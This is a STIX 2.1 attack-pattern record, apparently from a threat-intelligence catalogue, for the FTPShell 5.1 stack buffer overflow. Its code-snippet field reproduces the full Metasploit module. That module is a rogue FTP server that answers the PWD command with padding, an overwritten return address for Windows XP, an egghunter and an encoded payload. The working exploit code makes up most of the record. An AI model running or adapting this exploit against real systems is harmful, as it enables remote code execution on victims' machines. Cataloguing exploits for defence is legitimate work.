{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5c0349d-1c74-4a46-8af4-c5f15f6348ec",
    "created": "2024-08-14T16:51:13.827086Z",
    "modified": "2024-08-14T16:51:13.82709Z",
    "name": "FTPShell 5.1 Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in FTPShell 5.1. The overflow gets triggered when the ftp client tries to process an overly long response to a PWD command. This will overwrite the saved EIP and structured exception handler. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ftpshell51_pwd_reply.rb",
            "external_id": "ftpshell51_pwd_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Exploit::Remote::FtpServer\n  include Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FTPShell 5.1 Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in FTPShell 5.1. The overflow gets\n        triggered when the ftp client tries to process an overly long response to a PWD\n        command. This will overwrite the saved EIP and structured exception handler.\n      },\n      'Author' \t =>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>'\t#found bug, wrote the exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '68639'],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\xff\\x0d\\x5c\\x2f\\x0a\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Universal', { 'Offset' => 399, 'Ret' => 0x779A5483  } ], #jmp ebp [setupapi.dll]]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n\n  end\n\n\n  def setup\n    super\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n\n  def on_client_command_pwd(c,arg)\n\n    badchars = \"\"\n    eggoptions =\n    {\n    :checksum => true,\n    :eggtag => \"w00t\"\n    }\n    hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)\n\n    print_status(\" - PWD command -> Sending payload\")\n    junk = \"A\" * target['Offset']\n    nops = \"A\" * 10\n    tweakhunter = \"\\x5a\\x5a\"\n    eip = [target.ret].pack('V')\n    buffer = junk + eip + nops + tweakhunter + hunter + egg\n    pwdoutput = \"257  \\\"/\" + buffer+ \"\\\" is current directory\\r\\n\"\n    c.put(pwdoutput)\n    print_status(\" - Sent #{pwdoutput.length} bytes, wait for hunter\")\n    return\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}